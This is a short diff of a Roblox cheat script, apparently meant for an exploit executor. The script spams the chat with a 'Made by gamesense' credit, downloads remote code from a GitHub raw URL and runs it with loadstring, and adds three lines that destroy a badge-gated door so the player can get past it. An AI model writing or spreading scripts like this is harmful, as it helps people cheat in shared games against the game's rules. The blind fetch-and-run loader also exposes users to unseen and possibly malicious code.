@@ -10,5 +10,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
 wait(0.5)
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by gamesense","All")
 loadstring(game:HttpGet('https://raw.githubusercontent.com/ur-dude/protected/main/Loader_1.txt'))()
-
+workspace.BadgeDoor:Destroy()
+workspace.BadgeDoor:Destroy()
+workspace.BadgeDoor:Destroy()
 -- stop look here
